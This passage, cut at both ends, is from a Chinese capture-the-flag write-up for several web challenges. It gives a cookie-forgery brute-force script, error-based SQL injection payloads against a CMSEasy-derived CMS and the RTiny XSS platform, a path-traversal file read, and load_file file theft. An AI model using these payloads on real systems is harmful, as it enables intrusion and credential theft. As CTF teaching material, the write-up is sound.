</span></span><span class=line><span class=cl>    <span class=nv>$key</span><span class=o>=</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$rnd</span><span class=o>.</span><span class=nv>$key</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$s</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=nv>$i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span><span class=nv>$i</span><span class=o>&lt;</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$txt</span><span class=p>);</span><span class=nv>$i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$s</span> <span class=o>==</span> <span class=mi>32</span><span class=p>)</span> <span class=nv>$s</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$ttmp</span> <span class=o>.=</span> <span class=nv>$txt</span><span class=p>[</span><span class=nv>$i</span><span class=p>]</span> <span class=o>^</span> <span class=nv>$key</span><span class=p>[</span><span class=o>++</span><span class=nv>$s</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nv>$rnd</span><span class=o>.</span><span class=nv>$ttmp</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>decrypt</span><span class=p>(</span><span class=nv>$txt</span><span class=p>,</span><span class=nv>$key</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$txt</span><span class=o>=</span><span class=nx>base64_decode</span><span class=p>(</span><span class=nv>$txt</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$rnd</span> <span class=o>=</span> <span class=nx>substr</span><span class=p>(</span><span class=nv>$txt</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$txt</span> <span class=o>=</span> <span class=nx>substr</span><span class=p>(</span><span class=nv>$txt</span><span class=p>,</span><span class=mi>4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$key</span><span class=o>=</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$rnd</span><span class=o>.</span><span class=nv>$key</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$s</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=nv>$i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span><span class=nv>$i</span><span class=o>&lt;</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$txt</span><span class=p>);</span><span class=nv>$i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$s</span> <span class=o>==</span> <span class=mi>32</span><span class=p>)</span> <span class=nv>$s</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$tmp</span> <span class=o>.=</span> <span class=nv>$txt</span><span class=p>[</span><span class=nv>$i</span><span class=p>]</span><span class=o>^</span><span class=nv>$key</span><span class=p>[</span><span class=o>++</span><span class=nv>$s</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=nv>$i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span><span class=nv>$i</span><span class=o>&lt;</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$tmp</span><span class=p>);</span><span class=nv>$i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$tmp1</span> <span class=o>.=</span> <span class=nx>chr</span><span class=p>(</span><span class=nx>ord</span><span class=p>(</span><span class=nv>$tmp</span><span class=p>[</span><span class=nv>$i</span><span class=p>])</span><span class=o>-</span><span class=mi>10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$tmp1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$username</span> <span class=o>=</span> <span class=nx>decrypt</span><span class=p>(</span><span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>],</span><span class=nv>$key</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nv>$username</span> <span class=o>==</span><span class=s1>&#39;system&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nv>$flag</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>setcookie</span><span class=p>(</span><span class=s1>&#39;user&#39;</span><span class=p>,</span><span class=nx>encrypt</span><span class=p>(</span><span class=s1>&#39;guest&#39;</span><span class=p>,</span><span class=nv>$key</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;╮(╯▽╰)╭&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>先不管加解密过程，只看最后几行主程序：将 cookie 中的 <code>user</code> 通过 <code>key</code> 解密，如果得到明文为 <code>system</code> 则成功，否则将返回 <code>guest</code> 经过 <code>key</code> 加密后的密文。显然后者是我们获得 <code>key</code> 值的关键。</p><p>然后关注加密过程：先将每个字符的 ASCII 码加 10 得到新的 <code>txt</code>，随后随机生成 4 个字符 <code>rnd</code> 与 <code>key</code> 拼接后进行 MD5，得到新 <code>key</code>。将新 <code>txt</code> 与新 <code>key</code> 按字符异或得到 <code>ttmp</code>，若 <code>txt</code> 的长度超出 <code>key</code> 则在 <code>key</code> 后继续拼接 <code>key</code>。最后，返回 <code>rnd</code> 拼接上 <code>ttmp</code> 后的 base64 值就是密文。</p><p>附 python2 脚本（python3 中的 byte 和 str 转换可能导致错误结果）：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s1>&#39;http://036fb8c596914fd18ad96399893a61dd9da80da355bf450e.changame.ichunqiu.com/fl3g_ichuqiu.php&#39;</span>
</span></span><span class=line><span class=cl><span class=n>cookie</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>)</span><span class=o>.</span><span class=n>cookies</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>txt</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>cookie</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rnd</span> <span class=o>=</span> <span class=n>txt</span><span class=p>[:</span><span class=mi>4</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>ttmp</span> <span class=o>=</span> <span class=n>txt</span><span class=p>[</span><span class=mi>4</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=s1>&#39;aaaaaa&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>guest</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=s1>&#39;guest&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>system</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=s1>&#39;system&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>5</span><span class=p>):</span>
</span></span><span class=line><span class=cl>  <span class=n>guest</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=nb>chr</span><span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>guest</span><span class=p>[</span><span class=n>i</span><span class=p>])</span> <span class=o>+</span> <span class=mi>10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>5</span><span class=p>):</span>
</span></span><span class=line><span class=cl>  <span class=n>key</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=nb>chr</span><span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>ttmp</span><span class=p>[</span><span class=n>i</span><span class=p>])</span> <span class=o>^</span> <span class=nb>ord</span><span class=p>(</span><span class=n>guest</span><span class=p>[</span><span class=n>i</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>6</span><span class=p>):</span>
</span></span><span class=line><span class=cl>  <span class=n>system</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=nb>chr</span><span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>system</span><span class=p>[</span><span class=n>i</span><span class=p>])</span> <span class=o>+</span> <span class=mi>10</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>cookies</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=s1>&#39;1234567890abcdef&#39;</span><span class=p>:</span> <span class=c1># md5</span>
</span></span><span class=line><span class=cl>  <span class=n>key</span><span class=p>[</span><span class=mi>5</span><span class=p>]</span> <span class=o>=</span> <span class=n>c</span>
</span></span><span class=line><span class=cl>  <span class=n>ttnew</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>6</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>ttnew</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>key</span><span class=p>[</span><span class=n>i</span><span class=p>])</span> <span class=o>^</span> <span class=nb>ord</span><span class=p>(</span><span class=n>system</span><span class=p>[</span><span class=n>i</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>  <span class=n>cookies</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>rnd</span> <span class=o>+</span> <span class=n>ttnew</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>cookies</span><span class=p>:</span>
</span></span><span class=line><span class=cl>  <span class=n>cookie</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;user&#39;</span><span class=p>:</span> <span class=n>i</span><span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=p>,</span> <span class=n>cookies</span><span class=o>=</span><span class=n>cookie</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=nb>print</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span>
</span></span></code></pre></td></tr></table></div></div><p>这题才应该叫爆破。。最后其实是爆破 <code>key</code> 的第 6 位才出的结果。</p><h2 id=yesercms>YeserCMS</h2><p>进入 CMS 乱点一波发现是从 cmseasy，网上查到了 <a href="https://shuimugan.com/bug/view?bug_no=137013" target=_blank rel="noopener noreffer">无限制报错注入漏洞</a>。</p><p>仿照漏洞 payload 来进行注入，POST 数据：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx&#39;,(updatexml(1,concat(0x7e,mid((select group_concat(concat(database())) ),1,32),0x7e),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- &lt;/q&gt;&lt;/xjxquery&gt;
</span></span></code></pre></td></tr></table></div></div><p>得到数据库名 <code>Yeser</code>。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx&#39;,(updatexml(1,concat(0x7e,mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,32),0x7e),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- &lt;/q&gt;&lt;/xjxquery&gt;
</span></span></code></pre></td></tr></table></div></div><p>这里由于长度无法显示所有表，可以修改 <code>1,32</code> 的 <code>1</code> 来查看后续表，我们需要的是 <code>yesercms_user</code>。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx&#39;,(updatexml(1,concat(0x7e,mid((select group_concat(column_name) from information_schema.columns where table_name=&#39;yesercms_user&#39;),1,32),0x7e),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- &lt;/q&gt;&lt;/xjxquery&gt;
</span></span></code></pre></td></tr></table></div></div><p>这里也会有许多列，我们需要的是 <code>username</code> 和 <code>password</code>。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx&#39;,(updatexml(1,concat(0x7e,mid((select concat(username,password) from yesercms_user),1,32),0x7e),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- &lt;/q&gt;&lt;/xjxquery&gt;
</span></span></code></pre></td></tr></table></div></div><p>这里的 password 显示不全，同样修改 <code>1,32</code> 的 <code>1</code> 来查看完整的 MD5 值：<code>ff512d4240cbbdeafada404677ccbe61</code>。解密得到密码：<code>Yeser231</code>。登录并进入后台管理页面。</p><p>管理页面内容很多，但是都没有什么注入点。最终，在 <code>模板</code>-><code>当前模板编辑</code> 中发现，编辑模板时会先读取相应的文件。因此我们任选一个文件，点击 <code>编辑</code> 并抓包，将唯一的参数 <code>id</code> 修改为想读取的文件。经测试，这里应该是 <code>../../flag.php</code>。</p><h2 id=xss-平台>XSS 平台</h2><p>尝试注入无果，构造非法参数 <code>pass=bbb&email[]=aaa</code> 得到报错信息，其中有一行：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>File &#34;/var/www/html/rtiny/login.py&#34;, line 20, in post
</span></span></code></pre></td></tr></table></div></div><p>结合题目名，得知这是使用 RTiny 编写的 XSS 平台，项目地址在 <a href=https://github.com/r0ker/Rtiny-xss target=_blank rel="noopener noreffer">这里</a>。其中，<code>rtiny/lock.py</code> 存在 SQL 注入漏洞，<code>post</code> 方法中对 <code>username</code> 没有任何过滤：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=ch>#!/usr/bin/env python</span>
</span></span><span class=line><span class=cl><span class=c1># -*- coding:utf-8 -*-</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>__author__</span> <span class=o>=</span> <span class=s1>&#39;r0ker&#39;</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>tornado.web</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>function</span> <span class=kn>import</span> <span class=n>md5</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>db</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>config</span> <span class=kn>import</span> <span class=n>URL</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>LockHandler</span><span class=p>(</span><span class=n>tornado</span><span class=o>.</span><span class=n>web</span><span class=o>.</span><span class=n>RequestHandler</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>get</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>set_secure_cookie</span><span class=p>(</span><span class=s2>&#34;lock&#34;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>render</span><span class=p>(</span><span class=s2>&#34;lock.html&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>post</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>username</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>get_secure_cookie</span><span class=p>(</span><span class=s2>&#34;username&#34;</span><span class=p>)</span> <span class=ow>or</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>        <span class=n>passwd</span> <span class=o>=</span> <span class=n>md5</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>get_argument</span><span class=p>(</span><span class=s1>&#39;password&#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>row</span> <span class=o>=</span> <span class=n>db</span><span class=o>.</span><span class=n>ct</span><span class=p>(</span><span class=s2>&#34;manager&#34;</span><span class=p>,</span> <span class=s2>&#34;*&#34;</span><span class=p>,</span> <span class=s2>&#34;username=&#39;&#34;</span><span class=o>+</span> <span class=n>username</span> <span class=o>+</span><span class=s2>&#34;&#39;and password=&#39;&#34;</span><span class=o>+</span> <span class=n>passwd</span> <span class=o>+</span><span class=s2>&#34;&#39;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>row</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>set_secure_cookie</span><span class=p>(</span><span class=s2>&#34;lock&#34;</span><span class=p>,</span> <span class=s2>&#34;0&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>redirect</span><span class=p>(</span><span class=s2>&#34;http://&#34;</span> <span class=o>+</span> <span class=n>URL</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>redirect</span><span class=p>(</span><span class=s2>&#34;http://&#34;</span> <span class=o>+</span> <span class=n>URL</span> <span class=o>+</span> <span class=s2>&#34;/lock&#34;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>而 <code>set_secure_cookie</code> 方法来自 <code>tornado</code>，该方法使用一个 <code>cookie_secret</code> 来加密 <code>cookie</code>。我们可以在 <code>index.py</code> 中发现这个 <code>cookie_secret</code>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=n>settings</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;static_path&#34;</span><span class=p>:</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>dirname</span><span class=p>(</span><span class=vm>__file__</span><span class=p>),</span> <span class=s2>&#34;themes/static&#34;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;template_path&#34;</span><span class=p>:</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>dirname</span><span class=p>(</span><span class=vm>__file__</span><span class=p>),</span> <span class=s2>&#34;themes&#34;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;cookie_secret&#34;</span><span class=p>:</span> <span class=s2>&#34;M0ehO260Qm2dD/MQFYfczYpUbJoyrkp6qYoI2hRw2jc=&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;login_url&#34;</span><span class=p>:</span> <span class=s2>&#34;/login&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>所以，我们在注入的时候，只需要将 payload 用 <code>cookie_secret</code> 加密即可。借助 <code>tornado</code> 写个脚本：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=kn>import</span> <span class=nn>tornado.web</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>tornado.ioloop</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>settings</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=s1>&#39;cookie_secret&#39;</span><span class=p>:</span> <span class=s1>&#39;M0ehO260Qm2dD/MQFYfczYpUbJoyrkp6qYoI2hRw2jc=&#39;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>MainHandler</span><span class=p>(</span><span class=n>tornado</span><span class=o>.</span><span class=n>web</span><span class=o>.</span><span class=n>RequestHandler</span><span class=p>):</span>
</span></span><span class=line><span class=cl>  <span class=k>def</span> <span class=nf>get</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=bp>self</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=s1>&#39;aaa&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># self.set_secure_cookie(&#39;username&#39;, &#34;&#39; and updatexml(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#&#34;)</span>
</span></span><span class=line><span class=cl>    <span class=c1># self.set_secure_cookie(&#39;username&#39;, &#34;&#39; and updatexml(1,concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name=&#39;manager&#39;),0x7e),1)#&#34;)</span>
</span></span><span class=line><span class=cl>    <span class=c1># self.set_secure_cookie(&#39;username&#39;, &#34;&#39; and updatexml(1,concat(0x7e, (select group_concat(username,&#39;||&#39;,password,&#39;||&#39;,email) from manager),0x7e),1)#&#34;)</span>
</span></span><span class=line><span class=cl>    <span class=bp>self</span><span class=o>.</span><span class=n>set_secure_cookie</span><span class=p>(</span><span class=s1>&#39;username&#39;</span><span class=p>,</span> <span class=s2>&#34;&#39; and updatexml(1,concat(0x7e, mid((select group_concat(username,&#39;||&#39;,password,&#39;||&#39;,email) from manager),30,40),0x7e),1)#&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=bp>self</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>get_secure_cookie</span><span class=p>(</span><span class=s1>&#39;username&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>makeapp</span><span class=p>():</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>tornado</span><span class=o>.</span><span class=n>web</span><span class=o>.</span><span class=n>Application</span><span class=p>([</span>
</span></span><span class=line><span class=cl>    <span class=p>(</span><span class=sa>r</span><span class=s1>&#39;/index&#39;</span><span class=p>,</span> <span class=n>MainHandler</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=p>],</span> <span class=o>**</span><span class=n>settings</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>makeapp</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>listen</span><span class=p>(</span><span class=mi>8089</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>tornado</span><span class=o>.</span><span class=n>ioloop</span><span class=o>.</span><span class=n>IOLoop</span><span class=o>.</span><span class=n>instance</span><span class=p>()</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>浏览器访问本机 8089 端口，在返回头 <code>Set-Cookie</code> 中得到加密后的注入语句，带着这个 cookie 访问网页的 <code>/lock</code>（而不是 <code>/login</code>）。在爆用户名、密码和邮箱时，显示长度有限制，因此需要分两次用 <code>mid</code> 截取，最终得到用户名、密码和邮箱为：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ichuqiu||318a61264482e503090facfc4337207f||545
</span></span></code></pre></td></tr></table></div></div><p>密码经过 MD5 解密得到：<code>Myxss623</code>。登录在后台发现 <code>f13g_ls_here.txt</code> 文件，继续通过注入读取该文件。将代码中 <code>set_secure_cookie</code> 的第二个参数改为：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&#34;&#39; and updatexml(1,concat(0x7e, (select load_file(&#39;/var/www/html/fl3g_ls_here.txt&#39;)),0x7e),1)#&#34;
